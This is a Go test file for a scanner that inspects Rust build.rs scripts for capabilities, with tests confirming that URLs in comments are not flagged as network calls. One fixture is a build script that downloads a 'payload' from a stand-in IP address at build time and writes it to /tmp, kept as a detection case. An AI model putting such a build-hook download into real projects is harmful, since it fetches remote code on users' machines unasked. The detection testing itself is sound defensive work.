package installsurface

import "testing"

// Found via a fluxfang re-baseline sweep (August 2026), after coverage
// improvements let more build.rs files be read than before: AnalyzeRust
// was one of the few Analyze* functions not already stripping comments
// before capability scanning. A URL cited in a documentation comment —
// the extremely common Rust idiom of linking a stabilization blog post or
// GitHub issue to explain a version-gated `cfg` check — read as CapNetwork
// exactly like a real outbound call. Confirmed on a real scan: 17 false
// VC-002b findings on one project, every one a citation or license URL,
// zero real network calls, on crates as far from "does networking" as
// serde/anyhow/thiserror/proc-macro2/quote/zerocopy/rustix/winapi.

// TestAnalyzeRustIgnoresCommentURLs covers the real evidence strings from
// the fluxfang findings, reproduced structurally.
func TestAnalyzeRustIgnoresCommentURLs(t *testing.T) {
	cases := []string{
		// anyhow's real shape: cfg-check citing a Rust blog post + cargo/rust issues
		`
fn main() {
    // https://blog.rust-lang.org/2024/09/05/Rust-1.81.0.html#coreerrorerror
    // https://github.com/rust-lang/cargo/issues/11138
    // https://github.com/rust-lang/rust/issues/114839
    println!("cargo:rustc-check-cfg=cfg(error_generic_member_access)");
}`,
		// winapi's real shape: license header URLs in a block comment
		`
/*
 * Licensed under the MIT license http://opensource.org/licenses/MIT>,,
 * or the Apache License, Version 2.0 http://www.apache.org/licenses/LICENSE-2.0>,,
 */
fn main() {}`,
		// serde's shape: single blog-post citation
		`
fn main() {
    // https://blog.rust-lang.org/2024/05/02/Rust-1.78.0.html#diagnostic-attributes
    println!("cargo:rustc-check-cfg=cfg(no_diagnostic_namespace)");
}`,
	}
	for _, buildRs := range cases {
		s := AnalyzeRust(buildRs)
		if len(s.Hooks) != 1 {
			t.Fatalf("expected exactly one hook, got %d", len(s.Hooks))
		}
		h := s.Hooks[0]
		for _, c := range h.Caps {
			if c == CapNetwork {
				t.Errorf("did not expect CapNetwork for a comment-only URL citation: %q", buildRs)
			}
		}
		if len(h.Artifacts) != 0 {
			t.Errorf("did not expect any Remote artifacts from comment-only URLs, got %v", h.Artifacts)
		}
	}
}

// TestAnalyzeRustStillDetectsRealNetworkCalls is the necessary companion
// negative-of-the-negative: a REAL network call outside a comment must
// still be detected. Without this, a fix that over-corrects by stripping
// too aggressively would silently defeat OPU-32/39's cradle detection.
func TestAnalyzeRustStillDetectsRealNetworkCalls(t *testing.T) {
	buildRs := `
fn main() {
    // This comment mentions https://example.invalid/unrelated but the real
    // call below must still be detected.
    let bytes = reqwest::blocking::get("https://203.0.113.44/payload").unwrap().bytes().unwrap();
    std::fs::write("/tmp/out", &bytes).unwrap();
}`
	s := AnalyzeRust(buildRs)
	if len(s.Hooks) != 1 {
		t.Fatalf("expected exactly one hook, got %d", len(s.Hooks))
	}
	h := s.Hooks[0]
	found := false
	for _, c := range h.Caps {
		if c == CapNetwork {
			found = true
		}
	}
	if !found {
		t.Error("expected CapNetwork for a real reqwest::get call outside a comment")
	}
	// The comment's URL must not appear as an artifact; the real call's URL must.
	sawReal, sawFake := false, false
	for _, a := range h.Artifacts {
		if a.Ref == "https://203.0.113.44/payload" {
			sawReal = true
		}
		if a.Ref == "https://example.invalid/unrelated" {
			sawFake = true
		}
	}
	if !sawReal {
		t.Error("expected the real fetch URL to appear as an artifact")
	}
	if sawFake {
		t.Error("did not expect the comment-only URL to appear as an artifact")
	}
}
